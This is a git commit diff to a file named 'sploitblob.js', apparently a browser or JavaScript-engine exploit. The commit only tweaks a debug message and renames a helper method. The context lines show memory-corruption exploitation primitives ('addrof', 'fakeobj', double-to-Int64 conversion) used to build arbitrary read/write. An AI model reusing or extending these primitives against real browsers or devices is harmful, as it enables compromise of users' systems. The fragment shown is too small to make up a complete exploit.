f2231854a90e2e18d804d57dec963e7907f090f7
Turnerhackz1 <turner881189@gmail.com>
2022-02-23 13:21:34 -0600

    Update sploitblob.js

--- sploitblob.js
+++ sploitblob.js
@@ -516,12 +516,12 @@ var VM_PROT_EXECUTE = 0x4
               b1[0] = val;
               return new Int64.fromDouble(a1[0]);
             }
-            port.postMessage("obj addr" + addrof({}))
+            port.postMessage("obj addr@ " + addrof({}))
             var rw = {
                 fake: function(addr) {
                     fakeobj(addr)
                 },
-                add: function(obj) {
+                addr: function(obj) {
                     addrof(obj)
                 },
             }
